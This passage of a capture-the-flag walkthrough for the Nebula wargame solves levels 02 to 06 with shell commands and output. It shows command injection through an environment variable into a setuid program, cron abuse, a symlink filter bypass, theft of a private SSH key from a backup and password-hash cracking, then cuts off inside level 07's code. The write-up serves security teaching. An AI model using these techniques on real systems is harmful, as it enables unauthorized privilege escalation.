</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level02</h3>

<p>There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?</p>

<p>To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
</span><span class='line'>  <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;about to call system(</span><span class="se">\&quot;</span><span class="s">%s</span><span class="se">\&quot;</span><span class="s">)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">system</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Running this program outputs the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level02@nebula:/home/flag02$ ./flag02 
</span><span class='line'>about to call system("/bin/echo level02 is cool")
</span><span class='line'>level02 is cool</span></code></pre></td></tr></table></div></figure>


<p>The vulnerability is based on the fact that <em>getenv</em> is called on the USER environment variable. Since this is a SUID program, it&rsquo;s dangerous to trust the contents of the environment. The manpage actually provides a more secure alternative:</p>

<blockquote><p>The secure_getenv() function is intended  for  use  in  general-purpose
libraries  to  avoid vulnerabilities that could occur if set-user-ID or
set-group-ID programs accidentally trusted the environment.</p></blockquote>

<p>And we can exploit this by modifying the USER variable to make the program execute code of our choosing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level02@nebula:/home/flag02$ export USER='pwned;/bin/getflag;'
</span><span class='line'>level02@nebula:/home/flag02$ echo $USER
</span><span class='line'>pwned;/bin/getflag;
</span><span class='line'>level02@nebula:/home/flag02$ ./flag02 
</span><span class='line'>about to call system("/bin/echo pwned;/bin/getflag; is cool")
</span><span class='line'>pwned
</span><span class='line'>You have successfully executed getflag on a target account
</span><span class='line'>sh: is: command not found</span></code></pre></td></tr></table></div></figure>


<p>So why did this work? Remember this line:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buffer</span><span class="p">,</span> <span class="s">&quot;/bin/echo %s is cool&quot;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;USER&quot;</span><span class="p">));</span>
</span></code></pre></td></tr></table></div></figure>


<p>Normally the USER would be level02, so it would look like this: <code>/bin/echo level02 is cool</code>. But we have control of what is returned by <em>getenv</em>. The injection was <code>pwned;/bin/getflag;</code>. So now it becomes this: <code>/bin/echo pwned;/bin/getflag; is cool</code>. The &ldquo;pwned&rdquo; is there just so that the <em>echo</em> command can print something. Then the <strong>;</strong> terminates the <em>echo</em> command and chains a new one, executing <em>getflag</em>. And the final <strong>;</strong> acts to comment out the rest of the string that was to be displayed (notice that bash treated the string as a command and reported that it couldn&rsquo;t find it).</p>

<h3>Level03</h3>

<p>Check the home directory of flag03 and take note of the files there.</p>

<p>There is a crontab that is called every couple of minutes.</p>

<p>To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.</p>

<p>So we have a shell script and a directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03$ ls
</span><span class='line'>writable.d  writable.sh
</span><span class='line'>level03@nebula:/home/flag03$ cat writable.sh 
</span><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>for i in /home/flag03/writable.d/* ; do
</span><span class='line'>  (ulimit -t 5; bash -x "$i")
</span><span class='line'>  rm -f "$i"
</span><span class='line'>done
</span></code></pre></td></tr></table></div></figure>


<p>So the crontab is executing this script that executes every file in the writable.d directory and then removes it. Which means all we have to do is put a file of our own that calles <em>getflag</em> in the directory, and wait for cron to do its job:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/home/flag03/writable.d$ cat &gt; exeme.sh 
</span><span class='line'>/bin/getflag &gt; /tmp/readme</span></code></pre></td></tr></table></div></figure>


<p>Now wait a bit and check the output:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level03@nebula:/tmp$ cat readme
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level04</h3>

<p>This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)</p>

<p>To do this level, log in as the level04 account with the password level04. Files for this level can be found in /home/flag04.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">rc</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s [file to read]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&quot;token&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;You may not access &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to open %s&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">rc</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">rc</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">,</span> <span class="s">&quot;Unable to read fd %d&quot;</span><span class="p">,</span> <span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">rc</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Right, so our goal is to read the token file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ls
</span><span class='line'>flag04  token</span></code></pre></td></tr></table></div></figure>


<p>We don&rsquo;t have permission to do so directly. The flag04 executable can read files but it&rsquo;s conveniently coded not to read the token file. However, it&rsquo;s able to read other files just fine, provided we don&rsquo;t run into permission issues. So I went to <em>/tmp</em> and made a symbolic link that points to the token file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/tmp$ ln -s /home/flag04/token /tmp/readthis
</span><span class='line'>level04@nebula:/tmp$ ls -l readthis 
</span><span class='line'>lrwxrwxrwx 1 level04 level04 18 2015-09-04 01:17 readthis -&gt; /home/flag04/token</span></code></pre></td></tr></table></div></figure>


<p>And now I had the flag04 binary read the symlink, and implicitly, the token:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level04@nebula:/home/flag04$ ./flag04 /tmp/readthis
</span><span class='line'>06508b5e-8909-4f38-b630-fdb148a848a2</span></code></pre></td></tr></table></div></figure>


<p>I was at a loss at what to do with this string, but since our objective is to run <em>getflag</em>, I tried <code>su flag04</code> and used the token as password and it worked. Then it was all a matter of running <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ /bin/getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level05</h3>

<p>Check the flag05 home directory. You are looking for weak directory permissions</p>

<p>To do this level, log in as the level05 account with the password level05. Files for this level can be found in /home/flag05.</p>

<p>Taking a look in the flag05 directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05$ ls -la 
</span><span class='line'>total 5
</span><span class='line'>drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
</span><span class='line'>drwxr-xr-x 1 root   root      60 2012-08-27 07:18 ..
</span><span class='line'>drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
</span><span class='line'>-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
</span><span class='line'>-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
</span><span class='line'>-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
</span><span class='line'>drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh</span></code></pre></td></tr></table></div></figure>


<p>Ok, the <em>.backup</em> folder seems interesting, let&rsquo;s see what&rsquo;s in there:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05/.backup$ ls
</span><span class='line'>backup-19072011.tgz
</span><span class='line'>level05@nebula:/home/flag05/.backup$ tar zxvf backup-19072011.tgz 
</span><span class='line'>.ssh/
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>.ssh/id_rsa.pub
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>tar: .ssh/id_rsa.pub: Cannot open: No such file or directory
</span><span class='line'>.ssh/id_rsa
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>tar: .ssh/id_rsa: Cannot open: No such file or directory
</span><span class='line'>.ssh/authorized_keys
</span><span class='line'>tar: .ssh: Cannot mkdir: Permission denied
</span><span class='line'>tar: .ssh/authorized_keys: Cannot open: No such file or directory
</span><span class='line'>tar: Exiting with failure status due to previous errors</span></code></pre></td></tr></table></div></figure>


<p>Oops! It looks like this is a backup of the <em>.ssh</em> folder but we only have read permissions in this directory:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/tmp$ ls -l /home/flag05/.backup/
</span><span class='line'>total 2
</span><span class='line'>-rw-rw-r-- 1 flag05 flag05 1826 2011-11-20 20:13 backup-19072011.tgz</span></code></pre></td></tr></table></div></figure>


<p>Not a problem though! We can just move the archive to a directory where we have more freedom:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/home/flag05/.backup$ cp backup-19072011.tgz /tmp/
</span><span class='line'>level05@nebula:/tmp$ tar vzxf backup-19072011.tgz 
</span><span class='line'>.ssh/
</span><span class='line'>.ssh/id_rsa.pub
</span><span class='line'>.ssh/id_rsa
</span><span class='line'>.ssh/authorized_keys</span></code></pre></td></tr></table></div></figure>


<p>And now with flag05&rsquo;s private key, we can SSH to the machine and run <em>getflag</em>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level05@nebula:/tmp/.ssh$ ssh -i id_rsa flag05@localhost
</span><span class='line'>  
</span><span class='line'>      _   __     __          __     
</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
</span><span class='line'>                                    
</span><span class='line'>    exploit-exercises.com/nebula
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For level descriptions, please see the above URL.
</span><span class='line'>
</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
</span><span class='line'>XX is the level number.
</span><span class='line'>
</span><span class='line'>Currently there are 20 levels (00 - 19).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>New release '12.04 LTS' available.
</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>flag05@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level06</h3>

<p>The flag06 account credentials came from a legacy unix system.</p>

<p>To do this level, log in as the level06 account with the password level06. Files for this level can be found in /home/flag06.</p>

<p>I looked around a bit, didn&rsquo;t find anything interesting in the files owned by flag06. But keeping the hint in mind, I took a cursory glance at the <code>/etc/passwd</code> file, and bingo!:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ cat /etc/passwd
</span><span class='line'>...
</span><span class='line'>flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>The password hash for the flag06 user is inside <em>/etc/passwd</em>! (as a remnant of the old times when this file also contained the passwords for the users). Time to get cracking! I copied the hash to a file and ran John on it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/Desktop# john --show hash
</span><span class='line'>?:hello
</span><span class='line'>
</span><span class='line'>1 password hash cracked, 0 left</span></code></pre></td></tr></table></div></figure>


<p>So the password is <em>hello</em>. Now it&rsquo;s just a matter of ssh&#8217;ing and getting the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>level06@nebula:/home/flag06$ ssh flag06@localhost
</span><span class='line'>The authenticity of host 'localhost (127.0.0.1)' can't be established.
</span><span class='line'>ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
</span><span class='line'>  
</span><span class='line'>      _   __     __          __     
</span><span class='line'>     / | / /__  / /_  __  __/ /___ _
</span><span class='line'>    /  |/ / _ \/ __ \/ / / / / __ `/
</span><span class='line'>   / /|  /  __/ /_/ / /_/ / / /_/ / 
</span><span class='line'>  /_/ |_/\___/_.___/\__,_/_/\__,_/  
</span><span class='line'>                                    
</span><span class='line'>    exploit-exercises.com/nebula
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>For level descriptions, please see the above URL.
</span><span class='line'>
</span><span class='line'>To log in, use the username of "levelXX" and password "levelXX", where
</span><span class='line'>XX is the level number.
</span><span class='line'>
</span><span class='line'>Currently there are 20 levels (00 - 19).
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>flag06@localhost's password: 
</span><span class='line'>Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>New release '12.04 LTS' available.
</span><span class='line'>Run 'do-release-upgrade' to upgrade to it.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>The programs included with the Ubuntu system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span><span class='line'>applicable law.
</span><span class='line'>
</span><span class='line'>flag06@nebula:~$ getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure>


<h3>Level 07</h3>

<p>The flag07 user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.</p>

<p>To do this level, log in as the level07 account with the password level07. Files for this level can be found in /home/flag07.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='perl'><span class='line'><span class="c1">#!/usr/bin/perl</span>
</span><span class='line'>
</span><span class='line'><span class="k">use</span> <span class="n">CGI</span> <span class="sx">qw{param}</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;Content-type: text/html\n\n&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">sub </span><span class="nf">ping</span> <span class="p">{</span>
</span><span class='line'>  <span class="nv">$host</span> <span class="o">=</span> <span class="nv">$_</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">print</span><span class="p">(</span><span class="s">&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;Ping results&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">@output</span> <span class="o">=</span> <span class="sb">`ping -c 3 $host 2&gt;&amp;1`</span><span class="p">;</span>
